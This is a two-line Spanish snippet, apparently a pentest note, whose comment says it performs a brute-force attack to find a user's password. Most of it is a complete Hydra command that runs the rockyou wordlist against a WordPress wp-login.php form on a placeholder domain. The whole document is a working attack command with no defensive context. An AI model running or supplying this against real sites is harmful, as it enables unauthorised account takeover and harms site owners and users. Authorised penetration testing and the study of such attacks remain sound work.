# Con este comando podemos hacer un ataque de fuerza bruta para averiguar la contraseña de un usuario o lista de usuarios
hydra -l 2nasix -P /usr/share/wordlists/rockyou.txt dominio.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -V
